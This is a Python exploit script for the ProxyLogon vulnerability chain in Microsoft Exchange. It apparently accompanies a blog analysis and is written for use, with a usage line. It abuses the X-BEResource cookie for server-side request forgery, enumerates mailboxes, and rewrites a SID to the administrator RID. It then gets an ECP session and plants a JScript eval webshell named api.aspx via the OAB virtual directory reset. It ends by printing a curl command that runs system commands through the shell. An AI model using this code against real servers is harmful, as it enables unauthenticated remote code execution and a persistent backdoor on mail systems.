# coding: utf-8

"""
Author: hosch3n
Reference: https://hosch3n.github.io/2021/08/22/ProxyLogon%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
"""

import sys

import random
import re
import requests
import string
import urllib3

urllib3.disable_warnings()
req = requests.session()

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "https://127.0.0.1:8080",
}

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"

webshell_content = "%3Cscript%20language%3D%22JScript%22%20runat%3D%22server%22%3E%20function%20Page_Load%28%29%7B%2F%2A%2A%2Feval%28Request%5B%22api%22%5D%2C%22unsafe%22%29%3B%7D%3C%2Fscript%3E"
webshell_name = "api.aspx"
webshell_path = f"inetpub\\wwwroot\\aspnet_client\\{webshell_name}"
# webshell_path = f"Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\{webshell_name}"
webshell_unc_path = f"\\\\127.0.0.1\\c$\\{webshell_path}"

def getRandom():
    chars = string.ascii_lowercase
    suffix_list = [
        ".axd", ".crx", ".css", ".eot", ".gif", ".jpg", ".is",
        ".htm", ".html", ".ico", ".manifest", ".mp3", ".msi",
        ".png", ".svg", ".ttf", ".wav", ".woff", ".bin", ".dat",
        ".exe", ".flt", ".mui", ".xap", ".skin"
    ]

    for name_len in range(random.randint(5, 9)):
        prefix_str = "".join(random.choice(chars) for _ in range(name_len))

    filename = f"{prefix_str}{random.choice(suffix_list)}"
    return filename

def exploit(target):
    try:
        print(f"[*] Target: {target}")

        bera_headers = {
            "User-Agent": user_agent,
            "Cookie": f"X-BEResource=@google.com:443/search#~1;",
        }
        resa = req.get(url=f"{target}/ecp/{getRandom()}", headers=bera_headers, verify=False)
        try:
            computer = resa.headers["X-FEServer"]
        except KeyError:
            print("[-] No X-FEServer")
            exit(0)
        print(f"[+] ComputerName: {computer}")

        berb_headers = {
            "User-Agent": user_agent,
            "Cookie": f"X-BEResource=@{computer}:443/ews/exchange.asmx#~1941962754;",
        }
        resb = req.get(url=f"{target}/ecp/{getRandom()}", headers=berb_headers, verify=False)
        try:
            domain = resb.headers["X-CalculatedBETarget"].split(',')[1].split('.',1)[1]
            print(f"[+] Domain: {domain}")
        except KeyError:
            print("[-] No X-CalculatedBETarget")
            exit(0)

        berc_headers = {
            "User-Agent": user_agent,
            "Cookie": f"X-BEResource=@{computer}:444/autodiscover/autodiscover.xml#~1941962754;",
            "Content-Type": "text/xml",
        }
        legacydn = ""
        with open("users.txt") as filei:
            users_list = filei.read().splitlines()
        for user in users_list:
            email = f"{user}@{domain}"
            autodiscover_data = f"""<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
                <Request>
                    <EMailAddress>{email}</EMailAddress>
                    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
                </Request>
            </Autodiscover>"""

            resc = req.post(url=f"{target}/ecp/{getRandom()}", headers=berc_headers, data=autodiscover_data, verify=False)
            if f"DisplayName" in resc.text:
                print(f"[+] Email: {email}")
                legacydn = re.findall('(?:<LegacyDN>)(.+?)(?:</LegacyDN>)', resc.text)
                break
            else:
                print("[-] No LegacyDN")
                exit(0)

        berd_headers = {
            "User-Agent": user_agent,
            "Cookie": f"X-BEResource=@{computer}:444/mapi/emsmdb?MailboxId={getRandom()}#~1941962754;",
            "X-Requesttype": "Connect",
            "X-Requestid": "{E2EA6C1C-E61B-49E9-9CFB-38184F907552}:123456",
            "X-Clientinfo": "{2EF33C39-49C8-421C-B876-CDF7F2AC3AA0}:123",
            "X-Clientapplication": "Outlook/15.0.4815.1002",
            "Content-Type": "application/mapi-http",
        }
        mapi_data = f"{legacydn[0]}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
        resd = req.post(url=f"{target}/ecp/{getRandom()}", headers=berd_headers, data=mapi_data, verify=False)
        try:
            sid = resd.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
            print(f"[+] Origin SID: {sid}")
        except IndexError:
            print("[-] No SID")
            exit(0)

        sid_rid = sid.rsplit("-", 1)
        if sid_rid[1] != '500':
            sid = sid_rid[0] + '-500'
        print(f"[+] Fixed SID: {sid}")

        bere_headers = {
            "User-Agent": user_agent,
            "Cookie": f"X-BEResource=@{computer}:444/ecp/proxyLogon.ecp#~1941962754;",
            "msExchLogonMailbox": sid,
        }
        sid_data = f"""<r at="Negotiate" ln=""><s>{sid}</s></r>"""
        rese = req.post(url=f"{target}/ecp/{getRandom()}", headers=bere_headers, data=sid_data, verify=False)
        try:
            sessid = rese.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]
            msExchEcpCanary = rese.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
            print(f"[+] Cookie: ASP.NET_SessionId={sessid}; msExchEcpCanary={msExchEcpCanary}")
        except IndexError:
            print("[-] No SessionId or msExchEcpCanary")
            exit(0)

        berf_headers = {
            "User-Agent": user_agent,
            "Cookie": f"X-BEResource=@{computer}:444/ecp/DDI/DDIService.svc/GetList?schema=VirtualDirectory&msExchEcpCanary={msExchEcpCanary}&#~1941962754; ASP.NET_SessionId={sessid}; msExchEcpCanary={msExchEcpCanary}",
            "msExchLogonMailbox": sid,
        }
        getlist_json = {"filter":
            {"Parameters":
                {
                    "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                    "SelectedView": "",
                    "SelectedVDirType": "OAB"
                }
            }
        }
        resf = req.post(url=f"{target}/ecp/{getRandom()}", headers=berf_headers, json=getlist_json, verify=False)
        try:
            oabid = resf.text.split('"RawIdentity":"')[1].split('"')[0]
            print(f"[+] OAB Id: {oabid}")
        except IndexError:
            print("[-] No OAB Id")
            exit(0)

        berg_headers = {
            "User-Agent": user_agent,
            "Cookie": f"X-BEResource=@{computer}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&#~1941962754; ASP.NET_SessionId={sessid}; msExchEcpCanary={msExchEcpCanary}",
            "msExchLogonMailbox": sid,
        }
        setobject_json = {
            "identity": {
                "__type": "Identity:ECP",
                "DisplayName": "OAB (Default Web Site)",
                "RawIdentity": oabid
            },
            "properties": {
                "Parameters": {
                    "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                    "ExternalUrl": f"http://x/#{webshell_content}"
                }
            }
        }
        resg = req.post(url=f"{target}/ecp/{getRandom()}", headers=berg_headers, json=setobject_json, verify=False)
        if resg.status_code != 200:
            print("[-] Set OAB ExtURL Error")
            exit(0)
        else:
            print("[+] Set OAB ExtURL Succeeded")

        berh_headers = {
            "User-Agent": user_agent,
            "Cookie": f"X-BEResource=@{computer}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&#~1941962754; ASP.NET_SessionId={sessid}; msExchEcpCanary={msExchEcpCanary}",
            "msExchLogonMailbox": sid,
        }
        reset_json = {
            "identity": {
                "__type": "Identity:ECP",
                "DisplayName": "OAB (Default Web Site)",
                "RawIdentity": oabid
            },
            "properties": {
                "Parameters": {
                    "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                    "FilePathName": webshell_unc_path
                }
            }
        }
        resh = req.post(url=f"{target}/ecp/{getRandom()}", headers=berh_headers, json=reset_json, verify=False)
        if resh.status_code != 200:
            print("[-] Reset OAB ExtURL Error")
            exit(0)
        else:
            print("[+] Reset OAB ExtURL Succeeded")

        webshell_url = f"{target}/aspnet_client/{webshell_name}"
        # webshell_url = f"{target}/owa/auth/{webshell_name}"
        resi = req.get(url=webshell_url, verify=False)
        if "OAB (Default Web Site)" in resi.text:
            print(f"""[!] Get WebShell: curl -ik {webshell_url} -d 'api=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())'""")
        else:
            print("[-] No WebShell")

    except requests.exceptions.RequestException as e:
        print(f"[ReqError]: {e}\n=>{target}")
        exit(0)


def main(argv):
    target = f"https://{argv[1]}"
    exploit(target)

if __name__ == "__main__":
    try:
        main(sys.argv)
    except IndexError:
        print("Usage: python3 exp.py mail.ews.lab")